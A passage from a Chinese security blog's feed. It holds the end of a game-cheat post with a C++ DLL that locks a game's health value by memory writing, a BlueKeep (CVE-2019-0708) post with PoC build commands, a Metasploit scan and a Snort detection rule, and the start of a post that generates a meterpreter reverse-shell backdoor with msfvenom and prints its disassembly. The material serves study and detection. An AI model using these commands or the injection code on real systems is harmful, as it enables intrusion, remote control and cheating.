class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><br><span class="hljs-function">DWORD WINAPI <span class="hljs-title">cheating</span><span class="hljs-params">(LPVOID lpParam)</span> </span>&#123;<br><span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;<br>DWORD health = <span class="hljs-number">100</span>;<br><br>DWORD addr = <span class="hljs-number">0x01A17C78</span>;<br><br>DWORD res = <span class="hljs-built_in">WriteProcessMemory</span>(INVALID_HANDLE_VALUE, (LPVOID)addr, &amp;health, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>);<br><br><span class="hljs-built_in">Sleep</span>(<span class="hljs-number">30</span>);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>&#123;<br><span class="hljs-comment">//MessageBox(NULL, &quot;Dll Attached&quot;, &quot;!!!&quot;, MB_OK);</span><br>::<span class="hljs-built_in">DisableThreadLibraryCalls</span>(hModule);<br><span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, cheating, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br><br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br><span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到cs进程打开此文件并创建了一个新的线程：</p><p><img src="https://i.loli.net/2019/08/04/PU6KBli5SQvkfTI.png"></p><p>效果如下，左下角血量（锁血延迟设置的较高0.3s，所以被秒没办法hhhh，我起了，一枪秒了，有什么好说的🔫）：</p><p><img src="https://i.loli.net/2019/08/04/sS3rQ8RkNxZo5O4.png"></p><p><img src="https://github.com/Hvnt3r/My_Images/blob/master/cs_dll_inject.gif?raw=true"></p><p>其实在做这个期间遇到一些坑：</p><ul><li><code>DllMain()</code>中不要创建多线程，易造成死锁，或者是长时间无返回的函数如<code>MessageBox()</code></li><li><code>CreateRemoteThread()</code>创建远程线程时，<code>Dll</code>中不能含有静态变量如静态字符串或者static声明的函数，会在附加时产生一些权限问题，且data段已经确定无法修改，这样操作可能会使远程线程崩溃</li><li>最好不要创建模态窗口</li><li>等等。。。</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;研究外挂只是想学一下r0,r3攻防对抗，不干坏事，乖巧.jpg&lt;/p&gt;
&lt;p&gt;这一次做一下锁血&lt;/p&gt;
&lt;p&gt;首先常规操作获取血量地址：&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2019/07/22/5d35d4989bfc534573.png&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="反外挂" scheme="https://www.hvnt3r.top/categories/%E5%8F%8D%E5%A4%96%E6%8C%82/"/>
    
    
    <category term="游戏安全" scheme="https://www.hvnt3r.top/tags/%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8/"/>
    
    <category term="进程注入" scheme="https://www.hvnt3r.top/tags/%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5/"/>
    
    <category term="DLL注入" scheme="https://www.hvnt3r.top/tags/DLL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-0708</title>
    <link href="https://www.hvnt3r.top/2019/05/CVE-2019-0708/"/>
    <id>https://www.hvnt3r.top/2019/05/CVE-2019-0708/</id>
    <published>2019-05-24T14:32:13.000Z</published>
    <updated>2022-02-16T12:06:42.855Z</updated>
    
    <content type="html"><![CDATA[<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><strong>复现环境：</strong></p><blockquote><p>攻击机：Kali Linux（Windows子系统）</p><p>目标主机：Windows 7 SP1 64位</p></blockquote><p><strong>准备环境|Poc下载&#x2F;编译</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt install dh-autoreconf<br>sudo apt install libssl-dev<br>sudo apt install libx11-dev<br>git <span class="hljs-built_in">clone</span> https://github.com/zerosum0x0/CVE-2019-0708.git<br><span class="hljs-built_in">cd</span> CVE-2019-0708/rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773/<br>./bootstrap<br>./configure --disable-credssp --disable-smartcard<br>make<br>./rdesktop 192.168.1.7:3389<br></code></pre></td></tr></table></figure><span id="more"></span><p>不知这个Poc在其他环境下编译结果如何，在我的Kali和Ubuntu的虚拟机和子系统中均未运行成功，我运行的是此作者的Metasploit版本Poc，Ruby文件在<a href="https://github.com/zerosum0x0/CVE-2019-0708%E4%B8%AD%EF%BC%8C%E5%B0%86%E6%96%87%E4%BB%B6%E6%94%BE%E5%88%B0Metasploit-FrameWork%E4%B8%8Bauxiliary/scanner/rdp/%E8%B7%AF%E5%BE%84%E4%B8%AD%EF%BC%8C%E9%AA%8C%E8%AF%81%E7%BB%93%E6%9E%9C%E5%A6%82%E4%B8%8B%EF%BC%9A">https://github.com/zerosum0x0/CVE-2019-0708中，将文件放到Metasploit-FrameWork下auxiliary/scanner/rdp/路径中，验证结果如下：</a></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"> <span class="hljs-comment">⚡</span> <span class="hljs-comment">root@kali</span>  <span class="hljs-comment">~</span>  <span class="hljs-comment">msfconsole</span><br>                                                  <br>     <span class="hljs-string">,</span>           <span class="hljs-string">,</span><br>    <span class="hljs-comment">/</span>             <span class="hljs-comment">\</span><br>   <span class="hljs-comment">((__</span>--<span class="hljs-literal">-</span><span class="hljs-string">,</span><span class="hljs-string">,</span><span class="hljs-string">,</span>--<span class="hljs-literal">-</span><span class="hljs-comment">__))</span><br>      <span class="hljs-comment">(_)</span> <span class="hljs-comment">O</span> <span class="hljs-comment">O</span> <span class="hljs-comment">(_)_________</span><br>         <span class="hljs-comment">\</span> <span class="hljs-comment">_</span> <span class="hljs-comment">/</span>            <span class="hljs-comment">|\</span><br>          <span class="hljs-comment">o_o</span> <span class="hljs-comment">\</span>   <span class="hljs-comment">M</span> <span class="hljs-comment">S</span> <span class="hljs-comment">F</span>   <span class="hljs-comment">|</span> <span class="hljs-comment">\</span><br>               <span class="hljs-comment">\</span>   <span class="hljs-comment">_____</span>  <span class="hljs-comment">|</span>  <span class="hljs-comment">*</span><br>                <span class="hljs-comment">|||</span>   <span class="hljs-comment">WW|||</span><br>                <span class="hljs-comment">|||</span>     <span class="hljs-comment">|||</span><br><br><br>       <span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">metasploit</span> <span class="hljs-comment">v4</span><span class="hljs-string">.</span><span class="hljs-comment">17</span><span class="hljs-string">.</span><span class="hljs-comment">21</span><span class="hljs-literal">-</span><span class="hljs-comment">dev</span>                         <span class="hljs-title">]</span><br><span class="hljs-literal">+</span> -- --<span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">1822</span> <span class="hljs-comment">exploits</span> <span class="hljs-literal">-</span> <span class="hljs-comment">1035</span> <span class="hljs-comment">auxiliary</span> <span class="hljs-literal">-</span> <span class="hljs-comment">316</span> <span class="hljs-comment">post</span>       <span class="hljs-title">]</span><br><span class="hljs-literal">+</span> -- --<span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">539</span> <span class="hljs-comment">payloads</span> <span class="hljs-literal">-</span> <span class="hljs-comment">42</span> <span class="hljs-comment">encoders</span> <span class="hljs-literal">-</span> <span class="hljs-comment">10</span> <span class="hljs-comment">nops</span>            <span class="hljs-title">]</span><br><span class="hljs-literal">+</span> -- --<span class="hljs-comment">=</span><span class="hljs-title">[</span> <span class="hljs-comment">Free Metasploit Pro trial: http://r</span><span class="hljs-literal">-</span><span class="hljs-comment">7</span><span class="hljs-string">.</span><span class="hljs-comment">co/trymsp</span> <span class="hljs-title">]</span><br><br><span class="hljs-comment">msf</span> &gt; <span class="hljs-comment">use</span> <span class="hljs-comment">auxiliary/scanner/rdp/bluekeep</span><br><span class="hljs-comment">msf</span> <span class="hljs-comment">auxiliary(scanner/rdp/bluekeep)</span> &gt; <span class="hljs-comment">show</span> <span class="hljs-comment">options</span><br><br><span class="hljs-comment">Module</span> <span class="hljs-comment">options</span> <span class="hljs-comment">(auxiliary/scanner/rdp/bluekeep):</span><br><br>   <span class="hljs-comment">Name</span>     <span class="hljs-comment">Current</span> <span class="hljs-comment">Setting</span>  <span class="hljs-comment">Required</span>  <span class="hljs-comment">Description</span><br>   --<span class="hljs-literal">-</span><span class="hljs-literal">-</span>     --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span>  --<span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><span class="hljs-literal">-</span><br>   <span class="hljs-comment">RHOSTS</span>                    <span class="hljs-comment">yes       The target address range</span> <span class="hljs-comment">or</span> <span class="hljs-comment">CIDR</span> <span class="hljs-comment">identifier</span><br>   <span class="hljs-comment">RPORT</span>    <span class="hljs-comment">3389</span>             <span class="hljs-comment">yes       The target port (TCP)</span><br>   <span class="hljs-comment">THREADS</span>  <span class="hljs-comment">1</span>                <span class="hljs-comment">yes</span>       <span class="hljs-comment">The</span> <span class="hljs-comment">number</span> <span class="hljs-comment">of</span> <span class="hljs-comment">concurrent</span> <span class="hljs-comment">threads</span><br><br><span class="hljs-comment">msf</span> <span class="hljs-comment">auxiliary(scanner/rdp/bluekeep)</span> &gt; <span class="hljs-comment">set</span> <span class="hljs-comment">RHOSTS</span> <span class="hljs-comment">192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">80</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><br><span class="hljs-comment">RHOSTS</span> <span class="hljs-comment">=</span>&gt; <span class="hljs-comment">192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">80</span><span class="hljs-string">.</span><span class="hljs-comment">129</span><br><span class="hljs-comment">msf</span> <span class="hljs-comment">auxiliary(scanner/rdp/bluekeep)</span> &gt; <span class="hljs-comment">run</span><br><br><span class="hljs-title">[</span><span class="hljs-literal">+</span><span class="hljs-title">]</span> <span class="hljs-comment">192</span><span class="hljs-string">.</span><span class="hljs-comment">168</span><span class="hljs-string">.</span><span class="hljs-comment">80</span><span class="hljs-string">.</span><span class="hljs-comment">129:3389</span>   <span class="hljs-literal">-</span> <span class="hljs-comment">The</span> <span class="hljs-comment">target</span> <span class="hljs-comment">is</span> <span class="hljs-comment">vulnerable</span><span class="hljs-string">.</span><br><span class="hljs-title">[</span><span class="hljs-comment">*</span><span class="hljs-title">]</span> <span class="hljs-comment">Scanned</span> <span class="hljs-comment">1</span> <span class="hljs-comment">of</span> <span class="hljs-comment">1</span> <span class="hljs-comment">hosts</span> <span class="hljs-comment">(100%</span> <span class="hljs-comment">complete)</span><br><span class="hljs-title">[</span><span class="hljs-comment">*</span><span class="hljs-title">]</span> <span class="hljs-comment">Auxiliary</span> <span class="hljs-comment">module</span> <span class="hljs-comment">execution</span> <span class="hljs-comment">completed</span><br></code></pre></td></tr></table></figure><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><blockquote><p>The Remote Desktop Protocol (RDP) enables connection between a client and endpoint, defining the data communicated between them in virtual channels. Virtual channels are bidirectional data pipes which enable the extension of RDP. Windows Server 2000 defined 32 Static Virtual Channels (SVCs) with RDP 5.1, but due to limitations on the number of channels further defined Dynamic Virtual Channels (DVCs), which are contained within a dedicated SVC. SVCs are created at the start of a session and remain until session termination, unlike DVCs which are created and torn down on demand.</p><p>It’s this 32 SVC binding which CVE-2019-0708 patch fixes within the <em>_IcaBindVirtualChannels</em> and <em>_IcaRebindVirtualChannels</em> functions in the RDP driver termdd.sys. As can been seen in figure 1, the RDP Connection Sequence connections are initiated and channels setup prior to Security Commencement, which enables CVE-2019-0708 to be wormable since it can self-propagate over the network once it discovers open port 3389.</p></blockquote><p>远程桌面协议（RDP）支持客户端和端点之间的连接，定义虚拟通道中它们之间通信的数据。虚拟通道是双向数据管道，可以扩展RDP。 Windows Server 2000使用RDP 5.1定义了32个静态虚拟通道（SVC），但由于进一步定义了动态虚拟通道（DVC）的通道数量限制，这些通道包含在专用SVC中。 SVC在会话开始时创建并保持到会话终止，这与根据需要创建和拆除的DVC不同。</p><p>这是32个SVC绑定，CVE-2019-0708补丁修复了RDP驱动程序termdd.sys中的* _IcaBindVirtualChannels 和* _IcaRebindVirtualChannels 函数。如图1所示，RDP连接序列连接在安全开始之前启动并进行通道设置，这使得CVE-2019-0708可以设置，因为它可以在发现开放端口3389后通过网络自我传播。</p><p><img src="https://i.loli.net/2019/05/29/5cee2fc371cee59122.png"></p><p>图：RDP协议序列</p><blockquote><p>The vulnerability is due to the “MS_T120” SVC name being bound as a reference channel to the number 31 during the GCC Conference Initialization sequence of the RDP protocol. This channel name is used internally by Microsoft and there are no apparent legitimate use cases for a client to request connection over an SVC named “MS_T120.”</p><p>Figure 2 shows legitimate channel requests during the GCC Conference Initialization sequence with no MS_T120 channel.</p></blockquote><p>该漏洞是由于“MS_T120”SVC名称在RDP协议的GCC会议初始化序列期间被绑定为数字31的参考信道。 此通道名称由Microsoft在内部使用，并且客户端没有明显的合法用例来请求通过名为“MS_T120”的SVC进行连接。</p><p>下图显示了没有MS_T120信道的GCC会议初始化序列期间的合法信道请求。</p><p><img src="https://i.loli.net/2019/05/29/5cee30198697475600.png"></p><p>图：标准GCC会议初始化序列</p><blockquote><p>However, during GCC Conference Initialization, the Client supplies the channel name which is not whitelisted by the server, meaning an attacker can setup another SVC named “MS_T120” on a channel other than 31. It’s the use of MS_T120 in a channel other than 31 that leads to heap memory corruption and remote code execution (RCE).</p></blockquote><p>但是，在GCC会议初始化期间，客户端提供服务器未列入白名单的频道名称，这意味着攻击者可以在31以外的频道上设置另一个名为“MS_T120”的SVC。这是在31以外的频道中使用MS_T120 这会导致堆内存损坏和远程代码执行（RCE）。</p><p><img src="https://i.loli.net/2019/05/29/5cee3064994e040472.png"></p><p>图:异常&#x2F;可疑GCC会议初始化序列 - 非标准信道上的MS_T120</p><blockquote><p>The components involved in the MS_T120 channel management are highlighted in figure 4. The MS_T120 reference channel is created in the rdpwsx.dll and the heap pool allocated in rdpwp.sys. The heap corruption happens in termdd.sys when the MS_T120 reference channel is processed within the context of a channel index other than 31.</p></blockquote><p>图中突出显示了MS_T120通道管理中涉及的组件.MS_D120引用通道在rdpwsx.dll和rdpwp.sys中分配的堆池中创建。 当在31以外的通道索引的上下文中处理MS_T120引用通道时，堆损坏发生在termdd.sys中。</p><p><img src="https://i.loli.net/2019/05/29/5cee3089252b376521.png"></p><p>图：Windows内核和用户组件</p><blockquote><p>The Microsoft patch as shown in figure 5 now adds a check for a client connection request using channel name “MS_T120” and ensures it binds to channel 31 <strong>only</strong>(1Fh) in the <em>_IcaBindVirtualChannels</em> and <em>_IcaRebindVirtualChannels</em> functions within termdd.sys.</p></blockquote><p>如图所示的Microsoft补丁现在使用通道名称“MS_T120”添加对客户端连接请求的检查，并确保它仅绑定到termdd.sys中的* _IcaBindVirtualChannels 和* _IcaRebindVirtualChannels 函数中的通道31（1Fh）。</p><p><img src="https://i.loli.net/2019/05/29/5cee31b917b3b10229.png"></p><p>图：Microsoft补丁添加通道绑定检查</p><h2 id="防火墙规则"><a href="#防火墙规则" class="headerlink" title="防火墙规则"></a>防火墙规则</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs snort">alert tcp any any -&gt; any 3389 (msg:&quot;NCC GROUP RDP connection setup with MS_T120 channel, potential CVE-2019-0708&quot;; flow:to_server,established; content:&quot;|03 00|&quot;; offset:0; depth:2; content:&quot;|02 f0|&quot;; distance:2; within:2; content:&quot;|00 05 00 14 7c 00 01|&quot;; within:512; content:&quot;|03 c0|&quot;; distance:3; within:384; content:&quot;MS_T120|00|&quot;; distance:6; within:372; threshold: type limit, track by_src, count 2, seconds 600; classtype:bad-unknown; reference:url,portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708; sid:190708; rev:1;)<br></code></pre></td></tr></table></figure><p><strong>参考资料：</strong></p><p>Mcafee官博：<a href="https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/">https://securingtomorrow.mcafee.com/other-blogs/mcafee-labs/rdp-stands-for-really-do-patch-understanding-the-wormable-rdp-vulnerability-cve-2019-0708/</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;漏洞验证&quot;&gt;&lt;a href=&quot;#漏洞验证&quot; class=&quot;headerlink&quot; title=&quot;漏洞验证&quot;&gt;&lt;/a&gt;漏洞验证&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;复现环境：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;攻击机：Kali Linux（Windows子系统）&lt;/p&gt;
&lt;p&gt;目标主机：Windows 7 SP1 64位&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;准备环境|Poc下载&amp;#x2F;编译&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;code class=&quot;hljs bash&quot;&gt;sudo apt install dh-autoreconf&lt;br&gt;sudo apt install libssl-dev&lt;br&gt;sudo apt install libx11-dev&lt;br&gt;git &lt;span class=&quot;hljs-built_in&quot;&gt;clone&lt;/span&gt; https://github.com/zerosum0x0/CVE-2019-0708.git&lt;br&gt;&lt;span class=&quot;hljs-built_in&quot;&gt;cd&lt;/span&gt; CVE-2019-0708/rdesktop-fork-bd6aa6acddf0ba640a49834807872f4cc0d0a773/&lt;br&gt;./bootstrap&lt;br&gt;./configure --disable-credssp --disable-smartcard&lt;br&gt;make&lt;br&gt;./rdesktop 192.168.1.7:3389&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://www.hvnt3r.top/categories/CVE/"/>
    
    
    <category term="Windows系统安全" scheme="https://www.hvnt3r.top/tags/Windows%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
    <category term="CVE" scheme="https://www.hvnt3r.top/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>开源网络入侵检测系统-Snort实战</title>
    <link href="https://www.hvnt3r.top/2019/05/%E5%BC%80%E6%BA%90%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort%E5%AE%9E%E6%88%98/"/>
    <id>https://www.hvnt3r.top/2019/05/%E5%BC%80%E6%BA%90%E7%BD%91%E7%BB%9C%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%B3%BB%E7%BB%9F-Snort%E5%AE%9E%E6%88%98/</id>
    <published>2019-05-19T01:08:10.000Z</published>
    <updated>2022-02-16T12:06:42.871Z</updated>
    
    <content type="html"><![CDATA[<p>Snort是一个开源的网络入侵检测系统，根据官方文档简单地学习了一下使用方法之后试一下实战应用，实战对象就是大名鼎鼎的meterpreter。</p><p><strong>安装Snort</strong></p><p>安装Snort的方法网上有教程，因此就不多说了，最简单的方法就是apt-get。</p><p>Kali启动！</p><p>用Kali Linux中的msfvenom生成一个后门程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.60.130 LPORT=6666 -f elf &gt; shell.elf<br></code></pre></td></tr></table></figure><span id="more"></span><p>生成好了</p><p><img src="https://i.loli.net/2019/05/19/5ce15e9ff038d28430.png"></p><h2 id="msfvenom后门分析"><a href="#msfvenom后门分析" class="headerlink" title="msfvenom后门分析"></a>msfvenom后门分析</h2><p>看一下msfvenom生成后门的情况，后门的大小只有207字节，十分短小精悍，实际上msfvenom生成的后门是有多种类型的，一种是生成一个完整的后门，后门中直接就有实现后门功能的代码，还有一种就是我们此次分析过程中用到的“微型后门”，运行后通过从黑客主机上加载真正的payload，称为反射型DLL注入，相比前者，后者更加隐蔽，后门难以被杀软发现，VT上60个反病毒引擎只有11个检测出来了：</p><p><img src="https://i.loli.net/2019/05/20/5ce2014e9dd0b72780.png"></p><p>winhex中木马的视图：</p><p><img src="https://i.loli.net/2019/05/20/5ce1f0c68c24212829.png"></p><p>放到IDA中看一下反汇编结果，发现函数调用是通过<code>int 80h</code>(Linux系统调用)的方式来调用的，主要代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs asm">LOAD:08048057                 xor     ebx, ebx<br>LOAD:08048059                 mul     ebx<br>LOAD:0804805B                 push    ebx<br>LOAD:0804805C                 inc     ebx             ; call<br>LOAD:0804805D                 push    ebx<br>LOAD:0804805E                 push    2<br>LOAD:08048060                 mov     al, 102<br>LOAD:08048062                 mov     ecx, esp        ; args<br>LOAD:08048064                 int     80h             ; sys_socketcall<br>LOAD:08048066                 xchg    eax, edi<br>LOAD:08048067                 pop     ebx<br>LOAD:08048068                 push    10000010001111001010100011000000b   //IP：192.168.60.130，虚拟机IP<br>LOAD:0804806D                 push    1010000110100000000000000010b //端口6666<br>LOAD:08048072                 mov     ecx, esp<br>LOAD:08048074                 push    66h<br>LOAD:08048076                 pop     eax<br>LOAD:08048077                 push    eax<br>LOAD:08048078                 push    ecx<br>LOAD:08048079                 push    edi<br>LOAD:0804807A                 mov     ecx, esp<br>LOAD:0804807C                 inc     ebx<br>LOAD:0804807D                 int     80h             ; sys_socketcall<br>LOAD:0804807F                 test    eax, eax<br>LOAD:08048081                 jns     short loc_804809C<br>LOAD:08048083                 dec     esi<br>LOAD:08048084                 jz      short sys_exit_loc_80480C3<br>LOAD:08048086                 push    162<br>LOAD:0804808B                 pop     eax<br>LOAD:0804808C                 push    0<br>LOAD:0804808E                 push    5<br>LOAD:08048090                 mov     ebx, esp        ; req<br>LOAD:08048092                 xor     ecx, ecx        ; rem<br>LOAD:08048094                 int     80h             ; LINUX - sys_nanosleep<br>LOAD:08048096                 test    eax, eax<br>LOAD:08048098                 jns     short loc_8048057<br>LOAD:0804809A                 jmp     short sys_exit_loc_80480C3<br>LOAD:0804809C ; ---------------------------------------------------------------------------<br>LOAD:0804809C<br>LOAD:0804809C loc_804809C:                            ; CODE XREF: start+2D↑j<br>LOAD:0804809C                 mov     dl, 7<br>LOAD:0804809E                 mov     ecx, 1000h<br>LOAD:080480A3                 mov     ebx, esp<br>LOAD:080480A5                 shr     ebx, 0Ch<br>LOAD:080480A8                 shl     ebx, 0Ch<br>LOAD:080480AB                 mov     al, 125         ; sys_mprotect<br>LOAD:080480AD                 int     80h             ; LINUX -<br>LOAD:080480AF                 test    eax, eax<br>LOAD:080480B1                 js      short sys_exit_loc_80480C3<br>LOAD:080480B3                 pop     ebx<br>LOAD:080480B4                 mov     ecx, esp<br>LOAD:080480B6                 cdq<br>LOAD:080480B7                 mov     dh, 0Ch<br>LOAD:080480B9                 mov     al, 3<br>LOAD:080480BB                 int     80h             ; LINUX - sys_read<br>LOAD:080480BD                 test    eax, eax<br>LOAD:080480BF                 js      short sys_exit_loc_80480C3<br>LOAD:080480C1                 jmp     ecx<br>LOAD:080480C3 ; ---------------------------------------------------------------------------<br>LOAD:080480C3<br>LOAD:080480C3 sys_exit_loc_80480C3:                   ; CODE XREF: start+30↑j<br>LOAD:080480C3                                         ; start+46↑j ...<br>LOAD:080480C3                 mov     eax, 1<br>LOAD:080480C8                 mov     ebx, 1          ; status<br>LOAD:080480CD                 int     80h             ; LINUX - sys_exit<br></code></pre></td></tr></table></figure><p>经过分析可以得出此木马的大致流程：</p><p><img src="https://i.loli.net/2019/05/20/5ce1fc7ca007515510.png"></p><h2 id="后门通信流量分析"><a href="#后门通信流量分析" class="headerlink" title="后门通信流量分析"></a>后门通信流量分析</h2><p>将后门程序复制到Ubuntu中，在运行之前在Kali上打开Wireshark和MSF</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 